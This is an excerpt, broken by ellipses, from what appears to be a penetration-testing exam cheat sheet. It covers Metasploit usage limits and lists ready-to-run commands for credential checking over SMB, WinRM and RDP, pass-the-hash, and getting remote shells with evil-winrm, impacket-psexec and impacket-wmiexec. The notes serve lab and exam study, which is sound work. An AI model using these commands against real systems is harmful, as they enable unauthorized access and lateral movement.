...
- [Standalone Machine Step-by-Step Methodology](#standalone-machine-step-by-step-methodology)
  - [Phase 0: Pre-Attack Setup](#phase-0-pre-attack-setup-1)
...
> **Can ONLY use Metasploit on ONE machine**

- Can use `exploit/multi/handler`
- Can use `msfvenom` for payload generation
- Can only use ONE Metasploit exploit module total
...
```shell
netexec smb $ip -u 'user' -p 'pass'          # SMB check
netexec winrm $ip -u 'user' -p 'pass'        # WinRM check
netexec rdp $ip -u 'user' -p 'pass'          # RDP check
netexec smb $ip -u 'user' -H 'HASH'          # Pass-the-hash
```
...
evil-winrm -i $ip -u 'user' -H 'HASH'        # PTH shell
impacket-psexec domain/user:pass@$ip         # PsExec shell
impacket-wmiexec domain/user:pass@$ip        # WMI shell
```
